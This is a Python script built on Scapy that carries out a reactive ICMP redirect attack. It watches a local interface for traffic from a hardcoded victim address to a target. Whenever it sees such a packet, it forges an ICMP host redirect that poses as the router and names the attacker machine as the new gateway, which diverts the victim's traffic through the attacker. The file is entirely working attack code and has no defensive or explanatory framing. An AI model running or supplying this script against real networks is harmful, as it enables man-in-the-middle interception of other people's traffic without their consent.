#!/usr/bin/env python3
"""
Reactive ICMP Redirect Attack - Responds to actual victim traffic
"""

from scapy.all import *
import sys

class ReactiveICMPRedirect:
    def __init__(self):
        self.victim_ip = "192.168.1.10"
        self.router_ip = "192.168.1.1" 
        self.attacker_ip = "192.168.1.20"
        self.target_ip = "10.0.0.100"
        self.interface = "eth0"
        self.running = True
        
    def packet_handler(self, pkt):
        """Handle captured packets and send redirects for victim traffic"""
        if not self.running:
            return
            
        # Check if this is victim traffic to our target
        if (pkt.haslayer(IP) and 
            pkt[IP].src == self.victim_ip and 
            pkt[IP].dst == self.target_ip):
            
            print(f"[*] Detected victim traffic: {self.victim_ip} -> {self.target_ip}")
            
            # Send ICMP redirect using the actual packet
            self.send_icmp_redirect(pkt)
            
    def send_icmp_redirect(self, original_pkt):
        """Send ICMP redirect in response to actual victim traffic"""
        try:
            print(f"[*] Sending ICMP redirect for actual packet...")
            
            # Extract the original IP packet
            if original_pkt.haslayer(Ether):
                orig_ip = original_pkt[IP]
            else:
                orig_ip = original_pkt
            
            # Create ICMP redirect packet
            redirect_ip = IP(src=self.router_ip, dst=self.victim_ip)
            redirect_icmp = ICMP(type=5, code=1, gw=self.attacker_ip)  # Host redirect
            
            # The redirect should contain the original IP header + 8 bytes of data
            redirect_packet = redirect_ip / redirect_icmp / orig_ip
            
            print(f"[*] Redirect details:")
            print(f"    From: {self.router_ip} (pretending to be router)")
            print(f"    To: {self.victim_ip}")
            print(f"    New gateway: {self.attacker_ip}")
            print(f"    For destination: {self.target_ip}")
            
            # Send the redirect
            send(redirect_packet, verbose=False)
            print(f"[+] ICMP redirect sent in response to victim's packet!")
            
        except Exception as e:
            print(f"[!] Error sending ICMP redirect: {e}")
    
    def start_monitoring(self):
        """Start monitoring for victim traffic"""
        print(f"Reactive ICMP Redirect Attack")
        print(f"=============================")
        print(f"Victim: {self.victim_ip}")
        print(f"Router: {self.router_ip}")
        print(f"Attacker: {self.attacker_ip}")
        print(f"Target: {self.target_ip}")
        print()
        print(f"[*] Monitoring interface {self.interface} for victim traffic...")
        print(f"[*] Will send ICMP redirects when victim contacts {self.target_ip}")
        print(f"[*] Press Ctrl+C to stop")
        print()
        
        try:
            # Monitor for victim traffic to target
            sniff(iface=self.interface, 
                  prn=self.packet_handler, 
                  filter=f"src {self.victim_ip} and dst {self.target_ip}",
                  store=0)
                  
        except KeyboardInterrupt:
            print(f"\n[*] Attack stopped by user")
            self.running = False

def main():
    print("Reactive ICMP Redirect Attack")
    print("=============================")
    
    attacker = ReactiveICMPRedirect()
    attacker.start_monitoring()

if __name__ == "__main__":
    main()
